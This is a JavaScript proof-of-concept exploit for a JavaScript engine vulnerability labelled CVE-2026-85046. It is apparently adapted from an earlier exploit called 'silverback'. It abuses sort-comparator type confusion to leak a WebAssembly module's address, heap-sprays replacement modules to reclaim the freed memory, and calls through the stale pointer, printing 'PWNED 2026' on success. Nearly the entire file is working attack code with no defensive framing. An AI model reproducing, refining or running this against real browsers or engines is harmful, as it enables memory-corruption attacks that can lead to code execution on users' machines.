// CVE-2026-85046 spray variant - no gc() needed
// Based on silverback by SneakyNachos
// Instead of gc() + targeted reclaim, spray thousands of replacement
// modules hoping one lands at the leaked address
 
var f64 = new Float64Array(1);
var bigUint64 = new BigUint64Array(f64.buffer);
var u32 = new Uint32Array(f64.buffer);
function hex(i) { return i.toString(16).padStart(8, '0'); }
function i2f(i) { bigUint64[0] = i; return f64[0]; }
function f2i(i) { f64[0] = i; return bigUint64[0]; }
function u2f(low, high) { u32[0] = high; u32[1] = low; return f64[0]; }
function low(i) { return i & 0xffffffffn; }
 
function confuse(a) {
    function compare() { a.fill(0); return -1; }
    a.sort(compare);
}
 
function copySmi(dst, src) { dst[100] = src[1]; }
function untag(src) { return src[1] - 0.25; }
 
// Warmup
for (let i = 0; i < 1000; ++i) {
    confuse([1, 2]);
    confuse([{}, {}]);
    copySmi(new Array(256).fill(0), [1, 2]);
    untag([1, 2]);
}
 
function addressFromSource(src) {
    const smi = Math.round(untag(src) + 0.25);
    return ((smi * 2) | 1) >>> 0;
}
 
// Original module - no imports, returns 0x1111
const originalBytes = new Uint8Array([
    0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,
    7,8,1,4,109,97,105,110,0,0,10,7,1,5,0,65,145,34,11
]);
 
// Replacement module - imports env.print, returns 0x2222
const replacementBytes = new Uint8Array([
    0,97,115,109,1,0,0,0,1,8,2,96,0,0,96,0,1,127,
    2,13,1,3,101,110,118,5,112,114,105,110,116,0,0,
    3,2,1,1,7,8,1,4,109,97,105,110,0,1,
    10,10,1,8,0,16,0,65,162,196,0,11
]);
 
const originalTemplate = new WebAssembly.Module(originalBytes);
const replacementTemplate = new WebAssembly.Module(replacementBytes);
 
const holder = new Array(256).fill(0);
let staleAddress;
 
// Step 1: leak the address of a Wasm module via sort confusion
(function install() {
    const padding = Array.from({length:1166}, (_, i) => ({x:i}));
    const alignment = new Array(0).fill(1.1);
    const module = structuredClone(originalTemplate);
    const src = [module, {}];
    if (padding[1165].x !== 1165 || alignment.length !== 0) throw new Error('padding check failed');
    confuse(src);
    staleAddress = addressFromSource(src);
    copySmi(holder, src);
})();
 
console.log('stale address: 0x' + hex(staleAddress));
 
// Step 2: instead of gc() + targeted reclaim, spray LOTS of replacement
// modules and check if any land at staleAddress
// Also null out references to encourage natural GC
 
// Clear the original reference
const transitionObject = {};
holder[0] = transitionObject;
 
// Spray phase - allocate many modules hoping one lands at staleAddress
const SPRAY_ROUNDS = 10;
const SPRAY_PER_ROUND = 64;
let hit = -1;
let hitModule = null;
 
console.log('spraying ' + (SPRAY_ROUNDS * SPRAY_PER_ROUND) + ' replacement modules...');
 
// Also allocate pressure to encourage GC of original
const pressure = [];
for (let p = 0; p < 50; p++) {
    pressure.push(new ArrayBuffer(0x100000)); // 1MB each = 50MB pressure
}
pressure.length = 0; // release
 
for (let round = 0; round < SPRAY_ROUNDS && hit < 0; round++) {
    const batch = [];
    for (let i = 0; i < SPRAY_PER_ROUND; i++) {
        batch.push(structuredClone(replacementTemplate));
    }
 
    // Check if any landed at our target
    for (let i = 0; i < batch.length && hit < 0; i++) {
        const src = [batch[i], {}];
        confuse(src);
        const addr = addressFromSource(src);
        if (addr === staleAddress) {
            hit = i;
            hitModule = batch[i];
            console.log('HIT in round ' + round + ' index ' + i);
            break;
        }
    }
 
    if (hit < 0) {
        console.log('round ' + round + ': no hit, best effort continuing...');
    }
}
 
// Step 3: try to call through stale pointer regardless
// Even without a perfect hit, attempt execution
let callbackCount = 0;
let marker = null;
let identity = false;
 
try {
    // holder[100] should still have our stale pointer from copySmi
    // try to instantiate it as a Wasm module
    const staleRef = holder[100];
    
    if (staleRef && typeof staleRef === 'object') {
        identity = (staleRef === hitModule);
        
        marker = new WebAssembly.Instance(staleRef, {
            env: {
                print() {
                    callbackCount++;
                    console.log('PWNED 2026 - callback fired!');
                }
            }
        }).exports.main();
        
        if (marker === 0x2222) {
            console.log('PWNED 2026 - replacement module executed!');
            console.log('marker: ' + marker);
            console.log('identity: ' + identity);
        } else if (marker === 0x1111) {
            console.log('original module still running (stale ptr not reclaimed)');
            console.log('marker: ' + marker);
        } else {
            console.log('unexpected marker: ' + marker);
        }
    } else {
        console.log('stale ref is not an object: ' + typeof staleRef);
    }
} catch(e) {
    console.log('execution error: ' + e.message);
}
 
const result = {
    staleAddress: '0x' + hex(staleAddress),
    hit,
    identity,
    callbackCount,
    marker,
    sprayed: SPRAY_ROUNDS * SPRAY_PER_ROUND
};
 
console.log('result: ' + JSON.stringify(result));
